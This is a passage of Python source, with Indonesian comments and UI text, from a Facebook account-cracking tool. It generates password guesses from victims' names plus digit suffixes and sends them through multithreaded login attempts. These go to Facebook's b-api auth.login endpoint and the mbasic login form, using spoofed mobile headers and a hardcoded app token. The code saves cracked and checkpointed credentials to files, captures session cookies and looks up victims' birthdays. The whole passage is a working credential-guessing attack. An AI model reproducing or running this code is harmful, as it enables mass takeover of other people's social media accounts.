	jalan(war+"Example : "+C+"123,1234,12345"+Q)
	paska = input(war+"pass : ")
	if paska == "" or paska == " ":
		jalan(war+"Don't Empty Bro")
		buat_angka()
	else:
		try:
			paska = paska.split(",")
			for n in paska:
				try:
					open(".paska", "a").write(str(int(n))+"|")
				except:pass
		except:
			try:
				open(".paska", "a").write(str(int(paska))+"|")
			except:pass

	hakiki_kntl = open(".paska", "r").read()
	if hakiki_kntl in ("", " ", "  ", "   "):
		jalan(war+"Enter Numbers, Not Letters :(")
		buat_angka()



def generateold(idt):
	results=[]
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+pln_tkn)
		op = json.loads(jok.text)
		text = op['name']
		for i in text.split(" "):
			i=i.lower()
			if len(i)>=6 :
				results.append(i)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i)
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i+"12")
				results.append(i+"khan")
				results.append("pakistan")
	except:
		results.append("123456")
		results.append("123456789")
		results.append("sayang")
	return results
#def generate(text):
def generatev6(text):
	results=[]
	kiky_gg_gtg = text
	qz = text.split(" ")
	try:
		sj = open(".pass", "r").read()
	except:
		sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				try:
					baH = n.split("DEPAN")[1]
					kaw = "0"
				except:
					try:
						baH = n.split("depan")[1]
						kaw = "1"
					except:
						try:
							baH = n.split("lengkap")[1]
							kow = "2"
						except:
							kaw = "0"
							baH = ""
				if baH == "":
					results.append(n)
				if kow == "2":
					results.append(text)
				if kaw == "1":
					results.append(qz[0].lower()+baH)
				else:
					results.append(qz[0]+baH)
	except Exception as e:pass
	text = text.lower()
	kika = text.split(" ")
	results.append(kika[0])
	results.append(kika[0]+"123")
	results.append(kika[0]+"1234")
	results.append(kika[0]+"12345")
#	results.append(kika[0]+"123456")
	results.append(text)
	return results
"""	for i in text.split(" "):
		i=i.lower()
		if len(i)>=6 :
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		elif len(i)==3 or len(i)==4 or len(i)==5 :
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		else:
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")
			results.append(text)
	return results
"""
#def generatekotol(n__a):
def generate(n__a):
	bocil_alok_bersatu_melawan_pubg = []
	n__a = n__a.lower()
	text = n__a
	text = text.lower()
	try:dmi__gtg = open(".paska", "r").read()
	except:dmi__gtg = "123|1234|12345"
	dmi__gtg = dmi__gtg.split("|")

	nama_tt_ = n__a.split(" ")
	for nolep in dmi__gtg:  # <===== NAMA DEPAN AJA + ANGKA MANUAL
		bocil_alok_bersatu_melawan_pubg.append(nama_tt_[0]+nolep)
	bocil_alok_bersatu_melawan_pubg.append(text)
	try:sj = open(".pass", "r").read()     # <====== PASS GABUNGAN
	except:sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				bocil_alok_bersatu_melawan_pubg.append(n)
	except:pass




	return bocil_alok_bersatu_melawan_pubg   
####### VERSION SIMPEL
"""
		if len(i)>=6 :
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")
		elif len(i)==3 or len(i)==4 or len(i)==5 :
			bocil_alok_bersatu_melawan_pubg.append(i)
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")
		else:
			bocil_alok_bersatu_melawan_pubg.append(i)
			bocil_alok_bersatu_melawan_pubg.append(i+"123")
			bocil_alok_bersatu_melawan_pubg.append(i+"1234")
			bocil_alok_bersatu_melawan_pubg.append(i+"12345")

	bocil_alok_bersatu_melawan_pubg.append()
"""




def generatev4(text):
	results=[]
	kiky_gg_gtg = text
	qz = text.split(" ")
	try:
		sj = open(".pass", "r").read()
	except:
		sj = ("KOSONG")
	try:
		paw = open(".paww", "r").read().split("|")
		for n in paw:
			if len(n)>= 5:
				try:
					baH = n.split("DEPAN")[1]
					kaw = "0"
				except:
					try:
						baH = n.split("depan")[1]
						kaw = "1"
					except:
						try:
							baH = n.split("lengkap")[1]
							kow = "2"
						except:
							kaw = "0"
							baH = ""
				if baH == "":
					results.append(n)
				if kow == "2":
					results.append(text)
				if kaw == "1":
					results.append(qz[0].lower()+baH)
				else:
					results.append(qz[0]+baH)
	except Exception as e:pass
	text = text.lower()
	for i in text.split(" "):
		i=i.lower()
		if len(i)>=6 :
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		elif len(i)==3 or len(i)==4 or len(i)==5 :
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")

		else:
			results.append(i)
			results.append(i+"123")
			results.append(i+"1234")
			results.append(i+"12345")
			results.append(i+"123456")
			results.append(text)
	return results
def log_api_1(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_api_2(em,pas):
 #   ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(10000, 40000)),"x-fb-net-hni": str(random.randint(10000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_1(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic_2(em,pas):
#    ua = _dapunta_dapunta_('ugent.txt','r').read()
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}

def log_api(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'json',
        'sdk_version': '2',
        'email': em,
        'locale': 'en_US',
        'password': pas,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def logger(em,pas,hosts):
    ua = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]']);r = requests.Session();r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});p = r.get("https://mbasic.facebook.com/");b = bs4.BeautifulSoup(p.text,"html.parser");meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text));data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":data.update({"email":em})
            elif i.get("name")=="pass":data.update({"pass":pas})
            else:data.update({i.get("name"):""})
        else:data.update({i.get("name"):i.get("value")})
    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""});r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"});po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    global ua
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}

    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
class crackmenu:

    def __init__(self,isifile):
        self.id = []
    def crackold(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        if "KIKY_GTG" == "KIKY_GTG":
            while True:
                jalan(war+"Example Password : pakistan,khan1234,123456789")
                pwx = input('\n'+inp+"Enter Password : ")
                jalan("%sPassword Used : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Fill Password Correctly !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimum 6 letter !!")
                else:
                    tanya_opsi()
                    self.pro_ses()
                    def mobile_n(zsc=None):
                        with zthreads(max_workers=35) as (form):
                             for uid in self.id:
                                 try:
                                     userid = uid.split('<=>')[0]
                                     form.submit(self.mobile_,userid,zsc )
                                 except: pass
                        os.remove(self.apk)
                        exit(war+"Done !!")

                    mobile_n(pwx.split(','))
                    break	     

    def pro_ses(self):
        jalan("\n")
        jalan(war+M+"If there is an error, please report to admin !")
        jalan(war+M+"If No Result Turns On Turn Off Airplane Mode For 5 Seconds")
        jalan(war+"Crack Process is Running Please Wait : "+Q+"["+C+datetime.now().strftime('%H:%M:%S')+Q+"]")
        print(war+"On Turn Off Airplane Mode If No Result\n"+war+"Crack Results That CP Is Saved In : "+K+"Hasil/CP-"+durasi+".txt\n"+Q+war+"Crack Results That OK Is Saved In: "+I+"Hasil/OK-"+durasi+".txt\n\n"+Q)

    def menu_crack(self):   # METHOD AUTO PASSWROD
        jalan("\n"+war+P+"Please Select Login Method !")
        jalan(war+P+"Don't Forget To Turn On Turn Off Airplane Mode\n")
        print(K+"[01] Method B-Api V1 ");time.sleep(0.02)
        print(K+"[02] Method B-Api V2 ");time.sleep(0.02)
        print(K+"[03] Method B-Api V3 ");time.sleep(0.02)
        print(K+"[04] Method Mbasic V1 ");time.sleep(0.02)
        print(K+"[05] Method Mbasic V2 ");time.sleep(0.02)
        print(K+"[06] Method Mbasic V3 ");time.sleep(0.02)
        print(K+"[07] Method Abdullah (OK IDS) \n");time.sleep(0.02)
    def menu_crack_m(self):   # METHOD MANUAL PASSWORD
        jalan("\n"+war+P+"Please Select Login Method !")
        jalan(war+P+"Don't Forget To Turn On Turn Off Airplane Mode\n")
        print(K+"[01] Method B-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(K+"[02] Method B-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(K+"[03] Method Mbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(K+"[04] Method Mbasic V2     ( Fast Crack  )");time.sleep(0.02)
        print(K+"[05] Method Abdullah (OK IDS)\n");time.sleep(0.02)

    def passmenu(self,isifile):
        try:
            self.apk = isifile
            self.id = open(self.apk).read().splitlines()
        except:
            print(war+'File Not Found! Try Again')
            time.sleep(2)
            menu()
        cjj = open(".paww", "w")
        print('\n'+war+'Please Select Password (Default/Manual/Combined)\n'+war+'[d/m/c] ?')
        zk = input(inp+'Choose : ')
        if zk in ('m','M','Manual','manual'):
            while True:
                jalan(war+"Example Password : pakistan,123456")
                pwx = input('\n'+inp+"Enter Password : ")
                jalan("%sPassword Used : %s%s"%(war,I,pwx))
                if pwx == '':
                    jalan(war+"Fill Password Correctly !!")
                elif len(pwx)<=5:
                    jalan(war+"Password Minimum 6 Letter !!")
                else:
                    tanya_opsi()
                    pilih_alam()
                    self.menu_crack_m()
                    jm = input(war+"Pilih :")
                    if jm == "":
                       jalan(war+"Fill it up correctly, Bro");time.sleep(1)
                       crackmenu().passmenu()
                    elif jm == "1" or jm == "01":
                       self.pro_ses()
                       def api_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.api, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       api_m(pwx.split(','))
                       break

                    elif jm == "2" or jm == "02":
                       self.pro_ses()
                       def apiv2_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.__api__, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       apiv2_m(pwx.split(','))
                       break

                    elif jm == "3" or jm == "03":
                       self.pro_ses()
                       def mbasic_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.mbasic, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")
                       mbasic_m(pwx.split(','))
                       break

                    elif jm == "4" or jm == "04":
                       self.pro_ses()
                       def mbasicv2_m(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.mbasicv1, userid, zsc)
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")

                       mbasicv2_m(pwx.split(','))
                       break
                    elif jm == "5" or jm == "05":
                       pilih_infong()
                       self.pro_ses()
                       def mobile_n(zsc=None):
                           with zthreads(max_workers=35) as (form):
                                for uid in self.id:
                                    try:
                                        userid = uid.split('<=>')[0]
                                        form.submit(self.mobile_,userid,zsc )
                                    except: pass
                           os.remove(self.apk)
                           exit(war+"Done !!")

                       mobile_n(pwx.split(','))
                       break
                    else:
                       jalan(war+"Fill it up correctly Bro");time.sleep(1)
                       crackmenu(isifile).passmenu(isifile)

        elif zk in ('d', 'D','Default','default'):
                tanya_opsi()
                pilih_alam()
                buat_angka()
                self.menu_crack() #Pilihan Method
                jm = input(war+"Choose :")
                if jm == "":
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
                   self.pro_ses()
                   self.KangCilok()
                elif jm == "2" or jm == "02":
                   self.pro_ses()
                   self.KangSUGENG()
                elif jm == "3" or jm == "03":
                   self.pro_ses()
                   self.KangKETOD()
                elif jm == "4" or jm == "04":
                   self.pro_ses()
                   self.KangJORDI()
                elif jm == "5" or jm == "05":
                   self.pro_ses()
                   self.KangBANDAR()
                elif jm == "6" or jm == "06":
                   self.pro_ses()
                   self.KangAGEN()
                elif jm == "7" or jm == "07":
                   pilih_infong()
                   self.pro_ses()
                   self.KangCOLMEXXX()
#                   self.KangCOLMEXXXX()
                else:
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu(isifile).passmenu(isifile)
        elif zk in ('C', 'c','Combined','combined','gabungan'):
                gabung_pw()
                tanya_opsi()
                pilih_alam()
                buat_angka()
                self.menu_crack() #Pilihan Method
                jm = input(war+"Choose :")
                if jm == "":
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu().passmenu()
                elif jm == "1" or jm == "01":
                   self.pro_ses()
                   self.KangCilok()
                elif jm == "2" or jm == "02":
                   self.pro_ses()
                   self.KangSUGENG()
                elif jm == "3" or jm == "03":
                   self.pro_ses()
                   self.KangKETOD()
                elif jm == "4" or jm == "04":
                   self.pro_ses()
                   self.KangJORDI()
                elif jm == "5" or jm == "05":
                   self.pro_ses()
                   self.KangBANDAR()
                elif jm == "6" or jm == "06":
                   self.pro_ses()
                   self.KangAGEN()
                elif jm == "7" or jm == "07":
                   pilih_infong()
                   self.pro_ses()
                   self.KangCOLMEXXX()
                else:
                   jalan(war+"Fill it up correctly Bro");time.sleep(1)
                   crackmenu(isifile).passmenu(isifile)
        else:
            print(war+'Fill Correctly !')
            time.sleep(2)
            crackmenu(isifile).passmenu(isifile)
        return


    def api(self, user, zkth):
        global ok,cp,loop
        for pw in zkth:
#            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            try:
                ua54 = open(".ua","r").read()
            except:
                ua54 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
                                      'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
                                      'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua54,"content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print ('\r%s[%s%s%s] %s%s|%s                 %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,I,user,pw,q))
                wrt = ('%s|%s'%(user,pw))
                ok.append(wrt)
                bokep_japan_yang_terbaru("OK", user, pw, "-") # jangan diedit check akun tap yes
                open('Hasil/OK-'+durasi+'.txt' , 'a+').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    token = open(".login.txt").read()
                    ttl = requests.get("https://graph.facebook.com/%s?access_token=%s"%(user, token)).json()["birthday"]
                    month, day, year = ttl.split("/")
                    month = bulan_ttl[month]
                    dob = ('%s %s %s'%(day, month, year))
                except Exception as e:
                    dob = (' ')
                    if opsii == "y" or "y" == opsii:
#                       sttt(user, pw, dob)
                       try:
                           log_hasill(user, pw, str(dob))
                       except:
                           log_hasill(user, pw, "")
                    else:
                       print ('\r%s[%s%s%s] %s%s|%s | %s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q));play_mpv('assalamualaikum.mp3')
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    cp.append(wrt)
                    bokep_japan_yang_terbaru("CP", user, pw, dob)
                    break
                    continue
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()

#                break
 #               continue
        loop += 1
    def mabasic(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = logger(fl.get("id"),i,"https://mbasic.facebook.com")
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob)
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "")
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
